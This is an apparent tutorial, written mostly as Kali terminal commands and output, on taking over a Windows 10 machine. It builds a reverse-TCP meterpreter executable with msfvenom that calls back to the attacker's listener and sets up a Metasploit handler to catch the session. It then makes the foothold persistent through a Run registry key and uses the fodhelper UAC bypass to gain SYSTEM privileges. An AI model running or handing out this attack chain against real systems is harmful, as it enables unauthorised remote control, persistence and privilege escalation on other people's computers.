# Compromise Windows-10
In this I will explain how to bypass Windows 10 ,make the attack persistence also UAC bypass on the target machine. We will be doing this with the help of payload created in kali linux.

Steps to create payload in kali linux: 

1. In kali terminal {WINDOWS 10 is 64bit bydefault}
┌──(bhavin㉿kali)-[~/Desktop]
└─$ msfvenom -p windows/x64/meterpreter/reverse_tcp  lhost=192.168.94.184 lport=1234 -f exe -o win10.exe  
                |                                  |        |          |      |    |   |      ||        |   
Syntax:-        |      Type of palyoad             |        | Your IP  |      |port|   |format||Filename|
[-] No platform was selected, choosing Msf::Module::Platform::Windows from the payload
[-] No arch selected, selecting arch: x64 from the payload
No encoder specified, outputting raw payload
Payload size: 510 bytes
Final size of exe file: 7168 bytes
Saved as: win10.exe


2. Payload will be created successfully if everything is correct.

3. Transfer the win10.exe file to the target machine.

4. In kali open msfconsole

┌──(bhavin㉿kali)-[~]
└─$ msfconsole                                                                                          

5. use a epxloit 

6. set exact same payload as used while creation of payload executable file.

7. use same lhost and lport 

msf6 > use exploit/multi/handler
[*] Using configured payload generic/shell_reverse_tcp
msf6 exploit(multi/handler) > set payload windows/x64/meterpreter/reverse_tcp
payload => windows/x64/meterpreter/reverse_tcp
msf6 exploit(multi/handler) > set lport 1234
lport => 1234
msf6 exploit(multi/handler) > set lhost 192.168.94.184
lhost => 192.168.94.184
msf6 exploit(multi/handler) > 

ALSO disable ExitOnSession 

msf6 exploit(multi/handler) > set ExitOnSession false 
ExitOnSession => false
msf6 exploit(multi/handler) > 

8. exploit

9. Double click the win10.exe file in Windows 10

10. In kali

msf6 exploit(multi/handler) > exploit -j
[*] Exploit running as background job 0.
[*] Exploit completed, but no session was created.

[*] Started reverse TCP handler on 192.168.94.184:1234 
msf6 exploit(multi/handler) > [*] Sending stage (200774 bytes) to 192.168.94.54
[*] Meterpreter session 1 opened (192.168.94.184:1234 -> 192.168.94.54:49943) at 2023-01-31 19:54:38 +0530
meterpreter > 

11. To make persistence 

meterpreter > background 
[*] Backgrounding session 1...
msf6 exploit(multi/handler) > search persistence

Matching Modules
================

   #   Name                                                  Disclosure Date  Rank       Check  Description
   -   ----                                                  ---------------  ----       -----  -----------
   0   exploit/linux/local/apt_package_manager_persistence   1999-03-09       excellent  No     APT Package Manager Persistence                                                                                                                             
   1   exploit/windows/local/ps_wmi_exec                     2012-08-19       excellent  No     Authenticated WMI Exec via Powershell
   2   exploit/linux/local/autostart_persistence             2006-02-13       excellent  No     Autostart Desktop Item Persistence                                                                                                                          
   3   exploit/linux/local/bash_profile_persistence          1989-06-08       normal     No     Bash Profile Persistence
   4   exploit/linux/local/cron_persistence                  1979-07-01       excellent  No     Cron Persistence
   5   exploit/osx/local/persistence                         2012-04-01       excellent  No     Mac OS X Persistent Payload Installer
   6   exploit/osx/local/sudo_password_bypass                2013-02-28       normal     Yes    Mac OS X Sudo Password Bypass
   7   exploit/windows/local/vss_persistence                 2011-10-21       excellent  No     Persistent Payload in Windows Volume Shadow Copy
   8   auxiliary/server/regsvr32_command_delivery_server                      normal     No     Regsvr32.exe (.sct) Command Delivery Server
   9   post/linux/manage/sshkey_persistence                                   excellent  No     SSH Key Persistence
   10  post/windows/manage/sshkey_persistence                                 good       No     SSH Key Persistence
   11  exploit/linux/local/service_persistence               1983-01-01       excellent  No     Service Persistence
   12  exploit/windows/local/wmi_persistence                 2017-06-06       normal     No     WMI Event Subscription Persistence                                                                                                                          
   13  post/windows/gather/enum_ad_managedby_groups                           normal     No     Windows Gather Active Directory Managed Groups
   14  post/windows/manage/persistence_exe                                    normal     No     Windows Manage Persistent EXE Payload Installer
   15  exploit/windows/local/s4u_persistence                 2013-01-02       excellent  No     Windows Manage User Level Persistent Payload Installer
   16  exploit/windows/local/persistence                     2011-10-19       excellent  No     Windows Persistent Registry Startup Payload Installer
   17  exploit/windows/local/persistence_service             2018-10-20       excellent  No     Windows Persistent Service Installer
   18  exploit/windows/local/registry_persistence            2015-07-01       excellent  Yes    Windows Registry Only Persistence                                                                                                                           
   19  exploit/windows/local/persistence_image_exec_options  2008-06-28       excellent  No     Windows Silent Process Exit Persistence                                                                                                                     
   20  exploit/linux/local/yum_package_manager_persistence   2003-12-17       excellent  No     Yum Package Manager Persistence                                                                                                                             
   21  exploit/unix/local/at_persistence                     1997-01-01       excellent  Yes    at(1) Persistence
   22  exploit/linux/local/rc_local_persistence              1980-10-01       excellent  No     rc.local Persistence


Interact with a module by name or index. For example info 22, use 22 or use exploit/linux/local/rc_local_persistence

msf6 exploit(multi/handler) > use 14

12. set the options 

13. 
msf6 post(windows/manage/persistence_exe) > set rexepath win10.exe
rexepath => win10.exe
msf6 post(windows/manage/persistence_exe) > set session
session => 
msf6 post(windows/manage/persistence_exe) > set session 1
session => 1
msf6 post(windows/manage/persistence_exe) > run 

[*] Running module against ABCD
[*] Reading Payload from file /home/bhavin/Desktop/win10.exe
[+] Persistent Script written to C:\Users\dummy\AppData\Local\Temp\default.exe
[*] Executing script C:\Users\dummy\AppData\Local\Temp\default.exe
[+] Agent executed with PID 9064
[*] Installing into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\kbYQVyTFMP
[*] Sending stage (200774 bytes) to 192.168.94.54
[+] Installed into autorun as HKCU\Software\Microsoft\Windows\CurrentVersion\Run\kbYQVyTFMP
[*] Cleanup Meterpreter RC File: /home/bhavin/.msf4/logs/persistence/ABCD_20230131.5741/ABCD_20230131.5741.rc
[*] Post module execution completed
msf6 post(windows/manage/persistence_exe) > [*] Meterpreter session 2 opened (192.168.94.184:1234 -> 192.168.94.54:49952) at 2023-01-31 19:57:43 +0530

14. UAC bypass 

msf6 post(windows/manage/persistence_exe) > search uac

Matching Modules
================

   #   Name                                                   Disclosure Date  Rank       Check  Description
   -   ----                                                   ---------------  ----       -----  -----------
   0   post/windows/manage/sticky_keys                                         normal     No     Sticky Keys Persistance Module
   1   exploit/windows/local/cve_2022_26904_superprofile      2022-03-17       excellent  Yes    User Profile Arbitrary Junction Creation Local Privilege Elevation
   2   exploit/windows/local/bypassuac_windows_store_filesys  2019-08-22       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe)
   3   exploit/windows/local/bypassuac_windows_store_reg      2019-02-19       manual     Yes    Windows 10 UAC Protection Bypass Via Windows Store (WSReset.exe) and Registry
   4   exploit/windows/local/ask                              2012-01-03       excellent  No     Windows Escalate UAC Execute RunAs
   5   exploit/windows/local/bypassuac                        2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass
   6   exploit/windows/local/bypassuac_injection              2010-12-31       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection)
   7   exploit/windows/local/bypassuac_injection_winsxs       2017-04-06       excellent  No     Windows Escalate UAC Protection Bypass (In Memory Injection) abusing WinSXS
   8   exploit/windows/local/bypassuac_vbs                    2015-08-22       excellent  No     Windows Escalate UAC Protection Bypass (ScriptHost Vulnerability)
   9   exploit/windows/local/bypassuac_comhijack              1900-01-01       excellent  Yes    Windows Escalate UAC Protection Bypass (Via COM Handler Hijack)
   10  exploit/windows/local/bypassuac_eventvwr               2016-08-15       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Eventvwr Registry Key)
   11  exploit/windows/local/bypassuac_sdclt                  2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via Shell Open Registry Key)
   12  exploit/windows/local/bypassuac_silentcleanup          2019-02-24       excellent  No     Windows Escalate UAC Protection Bypass (Via SilentCleanup)
   13  exploit/windows/local/bypassuac_dotnet_profiler        2017-03-17       excellent  Yes    Windows Escalate UAC Protection Bypass (Via dot net profiler)
   14  post/windows/gather/win_privs                                           normal     No     Windows Gather Privileges Enumeration
   15  exploit/windows/local/tokenmagic                       2017-05-25       excellent  Yes    Windows Privilege Escalation via TokenMagic (UAC Bypass)
   16  exploit/windows/local/bypassuac_fodhelper              2017-05-12       excellent  Yes    Windows UAC Protection Bypass (Via FodHelper Registry Key)
   17  exploit/windows/local/bypassuac_sluihijack             2018-01-15       excellent  Yes    Windows UAC Protection Bypass (Via Slui File Handler Hijack)


Interact with a module by name or index. For example info 17, use 17 or use exploit/windows/local/bypassuac_sluihijack

msf6 post(windows/manage/persistence_exe) > use 16


msf6 exploit(windows/local/bypassuac_fodhelper) > set session 2
session => 2
msf6 exploit(windows/local/bypassuac_fodhelper) > set lport 1234
lport => 1234
msf6 exploit(windows/local/bypassuac_fodhelper) > set target 1
target => 1
msf6 exploit(windows/local/bypassuac_fodhelper) > run 
[*] Meterpreter session 3 opened (192.168.94.184:1234 -> 192.168.94.54:49952) at 2023-01-31 19:57:43 +0530

meterpreter > getuid 
Server username: ABCD\dummy
meterpreter > getsystem 
meterpreter > getuid 
Server username: NT AUTHORITY\SYSTEM


